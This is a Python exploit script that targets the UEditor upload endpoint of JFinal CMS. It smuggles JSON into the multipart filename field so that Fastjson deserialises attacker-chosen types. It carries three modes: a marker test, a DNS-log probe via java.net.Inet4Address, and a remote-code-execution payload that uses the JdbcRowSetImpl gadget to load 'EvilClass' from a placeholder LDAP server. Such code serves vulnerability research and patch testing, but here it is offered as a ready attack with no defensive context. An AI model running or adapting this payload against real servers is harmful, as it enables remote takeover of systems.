import requests
import time
import os
#{"state": "SUCCESS","original": "flag".txt","size": "15","title": "1694779756965063097.txt","type": ".txt","url": "/jfinal_cms_war/jflyfox/ueditor/file/20230915/1694779756965063097.txt"}
def CreateBody(filename, fieldname, strBoundary,exp,mode):
    bRet = False
    sData = []
    sData.append('--%s' % strBoundary)
    #'Content-Disposition: form-data; name="uploadfile"; filename="XX-Net-1.3.6.zip"'
    if mode == 1:
        sData.append('Content-Disposition: form-data; name="%s";' % fieldname + 'filename=flag\",%s,"a":".txt'%(exp))
    sData.append('Content-Type: %s\r\n' % 'application/octet-stream')
 
    try:
        pFile = open(filename, 'rb')
        sData.append(str(pFile.read()))
        sData.append('--%s--\r\n' % strBoundary)
        bRet = True
    finally:
        pFile.close()
            
    return bRet, sData
 
def uploadfile(http_url, filename, fieldname,exp,mode):        
    if os.path.exists(filename):
        filesize = os.path.getsize(filename)
        print('file:' + filename + ' is %d bytes!' % filesize)
    else:
        print('file:' + filename + ' isn\'t exists!')
        return False
    
    strBoundary = '---------------------------%s' % hex(int(time.time() * 1000))
    bRet, sBodyData = CreateBody(filename, fieldname, strBoundary,exp,mode)
    if True == bRet:
        http_body = '\r\n'.join(sBodyData)
        headers = {
            "User-Agent":"Mozilla/5.0",
            "Content-Length":'%d' % filesize,
            "Content-Type":'multipart/form-data; boundary=%s' % strBoundary,
        }
        response = requests.post(http_url,data=http_body,headers=headers)
        # get response
        msg = response.text
        print("Response content:\n" + msg)
    else:
        print("CreateBody failed!")
        
    return bRet

if __name__ == "__main__":
    vul = "dns"
    if vul == "test":
        uploadfile("http://localhost:8080/jfinal_cms_war/ueditor?action=uploadfile","vul.txt","123",'"vulnerable":"hacked"',1)
    elif vul == "dns":
        uploadfile("http://localhost:8080/jfinal_cms_war/ueditor?action=uploadfile","vul.txt","123",'{"@type":"java.net.Inet4Address","val":"dnslog"}',1)
    elif vul =="rce":
        uploadfile("http://localhost:8080/jfinal_cms_war/ueditor?action=uploadfile","vul.txt","123",'{"a":{ "@type":"java.lang.Class", "val":"com.sun.rowset.JdbcRowSetImpl" }, "b":{ "@type":"com.sun.rowset.JdbcRowSetImpl", "dataSourceName":"ldap://yourvpsip:19001/EvilClass", "autoCommit":true}}',1)